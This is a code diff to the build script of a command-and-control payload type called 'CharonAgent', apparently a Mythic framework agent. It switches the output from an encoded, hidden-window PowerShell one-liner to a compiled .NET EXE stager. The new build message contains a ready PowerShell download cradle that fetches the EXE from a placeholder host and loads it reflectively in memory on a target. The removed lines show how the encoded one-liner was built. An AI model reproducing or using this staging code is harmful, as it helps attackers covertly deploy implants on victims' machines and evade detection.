@@ -39,8 +39,7 @@ class CharonAgent(PayloadType):
 
     build_steps = [
         BuildStep(step_name="Configuring Stager", step_description="Stamping configuration into .NET stager"),
-        BuildStep(step_name="Compiling Stager", step_description="Compiling C# stager with mcs"),
-        BuildStep(step_name="Generating One-Liner", step_description="Building PowerShell one-liner"),
+        BuildStep(step_name="Compiling Stager", step_description="Compiling .NET EXE with mcs"),
     ]
 
     async def build(self) -> BuildResponse:
@@ -65,14 +64,14 @@ class CharonAgent(PayloadType):
         # --- Compile with Mono mcs ---
         with tempfile.TemporaryDirectory(suffix=self.uuid) as tmpdir:
             cs_path = os.path.join(tmpdir, "Stager.cs")
-            dll_path = os.path.join(tmpdir, "Stager.dll")
+            exe_path = os.path.join(tmpdir, "Charon.exe")
 
             with open(cs_path, "w") as f:
                 f.write(stager_code)
 
             compile_cmd = (
-                f"mcs -target:library -optimize+ "
-                f"-out:{dll_path} "
+                f"mcs -target:exe -optimize+ "
+                f"-out:{exe_path} "
                 f"-reference:System.dll "
                 f"{cs_path}"
             )
@@ -95,40 +94,20 @@ class CharonAgent(PayloadType):
                 resp.build_message = error_msg
                 return resp
 
-            with open(dll_path, "rb") as f:
+            with open(exe_path, "rb") as f:
                 assembly_bytes = f.read()
 
         await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
             PayloadUUID=self.uuid,
             StepName="Compiling Stager",
-            StepStdout=f"Compiled .NET stager assembly ({len(assembly_bytes)} bytes)",
-            StepSuccess=True,
-        ))
-
-        # --- Generate PowerShell one-liner ---
-        assembly_b64 = base64.b64encode(assembly_bytes).decode()
-
-        ps_command = (
-            "[System.Reflection.Assembly]::Load("
-            "[Convert]::FromBase64String('"
-            f"{assembly_b64}"
-            "'));[Charon.Stager]::Execute()"
-        )
-
-        ps_encoded = base64.b64encode(ps_command.encode("utf-16-le")).decode()
-        one_liner = f"powershell -nop -w hidden -e {ps_encoded}"
-
-        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
-            PayloadUUID=self.uuid,
-            StepName="Generating One-Liner",
             StepStdout=(
-                f"PowerShell one-liner generated\n"
-                f"Assembly size: {len(assembly_bytes)} bytes\n"
-                f"One-liner length: {len(one_liner)} chars"
+                f"Compiled .NET stager EXE ({len(assembly_bytes)} bytes)\n\n"
+                f"Usage: Host this EXE and run on target:\n"
+                f"powershell -nop -w hidden -c \"[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://YOUR_HOST/charon.exe'));[Charon.Stager]::Execute()\""
             ),
             StepSuccess=True,
         ))
 
-        resp.payload = one_liner.encode()
+        resp.payload = assembly_bytes
         resp.build_message = "Charon stager built successfully"
         return resp
